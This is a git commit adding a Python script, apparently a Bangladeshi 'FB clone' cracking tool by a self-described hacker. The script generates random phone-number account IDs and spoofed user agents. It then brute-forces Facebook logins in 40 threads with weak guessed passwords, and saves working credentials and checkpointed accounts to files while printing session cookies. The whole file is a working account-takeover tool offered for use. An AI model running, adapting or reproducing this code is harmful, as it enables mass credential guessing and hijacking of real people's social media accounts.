9d20b10b4d83a76f57b1bee2fb69d01622bf550d
hacker404-3301 <148724981+hacker404-3301@users.noreply.github.com>
2023-11-12 04:56:10 -0800

    Add files via upload

---
+++ FB-CLONE (i) .py
@@ -0,0 +1,223 @@
+# 𝑪𝒓𝒆𝒂𝒕𝒆𝒅 𝒃𝒚 𝑯𝑬𝑨𝑹𝑻 𝑯𝑨𝑪𝑲𝑬𝑹 
+# Telegram Id : @Heart_Hacker
+# Facebook account: Md Abdullah (Heart Hacker)
+# GitHub: hacker404-3301
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
+import marshal
+import zlib
+import base64
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+    os.system('pkg install espeak')
+P = '\x1b[1;97m' # 
+M = '\033[1;33m' # 
+H = '\033[1;32m' # 
+K = '\x1b[1;97m' # 
+B = '\x1b[1;96m' # 
+U = '\x1b[1;95m' # 
+O = '\x1b[1;97m' # 
+N = '\x1b[0m'    # 
+id = []
+user = []
+oks = []
+cps = []
+loop = 0
+ugen=[]
+for ua in range(10000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
+      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,115)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      aalhaj=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(aalhaj)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(alhhaj)
+os.system("xdg-open https://github.com/hacker404-3301/")
+logo =("""       \033[1;32m  
+.s    s.  .s    s.  .s5SSSs.  .s5ssSs.  
+      SS.       SS.       SS.    SS SS. 
+sS    S%S sS    S%S sS    S%S sS SS S%S 
+SS    S%S SS    S%S SS    S%S SS :; S%S 
+SSSs. S%S SSSs. S%S SS .sS::' SS    S%S 
+SS    S%S SS    S%S SS        SS    S%S 
+SS    `:; SS    `:; SS        SS    `:; 
+SS    ;,. SS    ;,. SS        SS    ;,. 
+:;    ;:' :;    ;:' `:        :;    ;:'  
+\033[1;91m╔═════════════════════════╗
+\033[1;92m   	𝑪𝑹𝑬𝑨𝑻𝑬𝑫 𝑩𝒀 𝑯𝑬𝑨𝑹𝑻 𝑯𝑨𝑪𝑲𝑬𝑹
+\033[1;91m╚═════════════════════════╝
+""") 
+
+logo =("""
+\033[1;92m 𝑭𝑬𝑬𝑳 𝑻𝑯𝑬 𝑷𝑶𝑾𝑬𝑹 𝑾𝑰𝑻𝑯 𝑯𝑯𝑷𝑴
+""")
+ 
+def Alhaj():
+    os.system('clear')
+    os.system('xdg-open https://www.facebook.com/profile.php?id=100078990605486')
+    print(logo)
+    print("")
+    print("\033[1;96m ======================================================================================================================")
+    print("\033[1;36m   \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m 𝑹𝑨𝑵𝑫𝑶𝑴 𝑪𝑹𝑨𝑪𝑲 𝑩𝑫        \033[1;36m")
+    print("\033[1;96m ======================================================================================================================")
+    print(" \033[1;36m  \033[1;35m[\033[1;32m2\033[1;35m][\033[1;32mB\033[1;35m] \033[1;32m 𝑭𝑶𝑳𝑳𝑶𝑾 𝑴𝒀 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲 𝑨𝑪𝑪𝑶𝑼𝑵𝑻   \033[1;36m")
+    print(" \033[1;36m  \033[1;35m[\033[1;32m3\033[1;35m][\033[1;32mC\033[1;35m] \033[1;32m 𝑭𝑶𝑳𝑳𝑶𝑾 𝑴𝒀 𝑮𝑰𝑻𝑯𝑼𝑩 𝑨𝑪𝑪𝑶𝑼𝑵𝑻\033[1;36m")
+    print("\033[1;36m   \033[1;35m[\033[1;32m0\033[1;35m][\033[1;32mX\033[1;35m] \033[1;32m 𝑬𝑿𝑰𝑻                   \033[1;36m")
+    print("\033[1;96m ======================================================================================================================")
+    print("")
+    Alhaj = input(f'\033[1;32m 𝑺𝑬𝑳𝑬𝑪𝑻𝑬𝑫 𝒀𝑶𝑼𝑹 𝑶𝑷𝑻𝑰𝑶𝑵 :\033[1;36m ')
+    if Alhaj in ["1","A"]:
+        Alhajs()
+    if Alhaj in ["2","B"]:
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100078990605486')
+    if Alhaj in ["3","C"]:
+        os.system('xdg-open https://github.com/hacker404-3301/')
+    if Alhaj in ["0","X"]:
+        os.system('exit')
+
+def Alhajs():
+    user=[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print("\033[1;91m==========================================================")
+    print("\033[1;31m \033[1;36m  𝒀𝑶𝑼𝑹 𝑺𝑰𝑴 𝑪𝑶𝑫𝑬 : \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] \033[1;31m  ")
+    print("\033[1;91m==========================================================")
+    code = input('\033[1;32m 𝒀𝑶𝑼𝑹 𝑺𝑰𝑴 𝑪𝑶𝑫𝑬 :\033[1;36m ')
+    os.system('clear')
+    os.system('xdg-open https://www.facebook.com/profile.php?id=100078990605486')
+    print(logo)
+    print("\033[1;91m==========================================================")
+    print("\033[1;31m \033[1;36m  𝒀𝑶𝑼𝑹 𝑪𝑹𝑨𝑪𝑲 𝑳𝑰𝑴𝑰𝑻 : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] \033[1;31m  ")
+    print("\033[1;91m==========================================================")
+    limit=int(input("\033[1;32m 𝒀𝑶𝑼𝑹 𝑪𝑹𝑨𝑪𝑲 𝑳𝑰𝑴𝑰𝑻  :\033[1;36m "))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with ThreadPool(max_workers=40) as Fb_crack:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print("\033[1;91m=================================================")
+        print(f'\033[1;91m \033[1;92m 𝒀𝑶𝑼𝑹 𝑺𝑰𝑴 𝑪𝑶𝑫𝑬 : '+code) 
+        print(f'\033[1;91m \033[1;92m 𝑻𝑶𝑻𝑨𝑳 𝑨𝑪𝑪𝑶𝑼𝑵𝑻 : '+tl)
+        print(f'\033[1;91m \033[1;92m 𝑪𝑹𝑬𝑨𝑻𝑬𝑫 𝑩𝒀 𝑯𝑯𝑷𝑴 ')
+        print("\033[1;91m==================================================")
+        for love in user:
+            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','HHPM']
+            uid = code+love
+            Fb_crack.submit(Alhajm,uid,pwx,tl)
+    print("\033[1;91m=====================================")
+    print(' \033[1;91m[\033[1;92m😜\033[1;91m]\033[1;92m 𝑪𝑹𝑨𝑪𝑲𝑰𝑵𝑮 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬𝑫 ')
+    print(' \033[1;91m[\033[1;92m😜\033[1;91m]\033[1;92m 𝑻𝑯𝑨𝑵𝑲𝑺 𝑭𝑶𝑹 𝑼𝑺𝑰𝑵𝑮 ')
+    print("\033[1;91m=====================================")
+
+
+def Alhajm(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;91m[\033[1;92m𝑪𝑹𝑨𝑪𝑲𝑰𝑵𝑮\033[1;91m]🤭[\033[1;92m%s\033[1;91m]😜[\033[1;92m𝑶𝑲-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+    'method': 'GET',
+    'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '2',
+    'referer': 'https://mbasic.facebook.com/',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro,
+    'viewport-width': '980',}
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\033[1;96m[\033[1;92m𝑯𝑯𝑷𝑴-𝑶𝑲\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
+                print(f'\033[1;36m𝑪𝑶𝑶𝑲𝑰𝑬 : \033[1;35m'+coki)
+                open('/sdcard/𝑯𝑯𝑷𝑴-𝑶𝑲.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('\033[1;90m[𝑯𝑯𝑷𝑴-𝑪𝑷] '+uid+' ◉ '+ps+' \n')
+                open('/sdcard/𝑯𝑯𝑷𝑴-𝑪𝑷.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+ 
+Alhaj()
